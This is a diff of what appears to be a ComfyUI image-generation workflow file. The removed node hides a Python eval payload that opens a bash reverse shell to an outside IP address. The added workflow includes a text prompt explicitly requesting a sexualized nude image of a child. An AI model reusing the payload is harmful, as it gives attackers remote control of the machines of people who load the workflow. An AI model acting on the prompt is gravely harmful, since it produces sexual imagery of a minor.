@@ -1,39 +1,101 @@
 {
   "1": {
+    "class_type": "UNETLoader",
     "inputs": {
-      "expression": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
-      "input_count": 1,
-      "print_to_console": "False",
-      "update": null,
-      "in1": [
-        "2",
-        0
-      ]
-    },
-    "class_type": "EvaluateMultiple1",
-    "_meta": {
-      "title": "EvaluateMultiple1"
-    }
-  },
-  "2": {
-    "inputs": {
-      "noise_seed": 920431842220899
-    },
-    "class_type": "RandomNoise",
-    "_meta": {
-      "title": "Случайный шум"
+      "unet_name": "z_image_turbo_bf16.safetensors",
+      "weight_dtype": "default"
     }
   },
   "3": {
+    "class_type": "CLIPLoader",
     "inputs": {
-      "source": [
+      "clip_name": "qwen_3_4b.safetensors",
+      "type": "lumina2",
+      "device": "default"
+    }
+  },
+  "4": {
+    "class_type": "VAELoader",
+    "inputs": {
+      "vae_name": "ae.safetensors"
+    }
+  },
+  "5": {
+    "class_type": "CLIPTextEncode",
+    "inputs": {
+      "clip": [
+        "3",
+        0
+      ],
+      "text": "Amateur photo of pretty tween girl standing in bedroom. She is wearing nothing but thigh high socks. Full body"
+    }
+  },
+  "6": {
+    "class_type": "CLIPTextEncode",
+    "inputs": {
+      "clip": [
+        "3",
+        0
+      ],
+      "text": ""
+    }
+  },
+  "7": {
+    "class_type": "EmptySD3LatentImage",
+    "inputs": {
+      "width": 768,
+      "height": 1024,
+      "batch_size": 1
+    }
+  },
+  "8": {
+    "class_type": "KSampler",
+    "inputs": {
+      "model": [
         "1",
         0
+      ],
+      "positive": [
+        "5",
+        0
+      ],
+      "negative": [
+        "6",
+        0
+      ],
+      "latent_image": [
+        "7",
+        0
+      ],
+      "seed": 1202410039,
+      "steps": 9,
+      "cfg": 1.0,
+      "sampler_name": "euler_ancestral",
+      "scheduler": "beta",
+      "denoise": 1.0
+    }
+  },
+  "9": {
+    "class_type": "VAEDecode",
+    "inputs": {
+      "samples": [
+        "8",
+        0
+      ],
+      "vae": [
+        "4",
+        0
       ]
-    },
-    "class_type": "PreviewAny",
-    "_meta": {
-      "title": "Предпросмотр любого"
+    }
+  },
+  "10": {
+    "class_type": "SaveImage",
+    "inputs": {
+      "images": [
+        "9",
+        0
+      ],
+      "filename_prefix": "zimg/유이_canonical"
     }
   }
 }
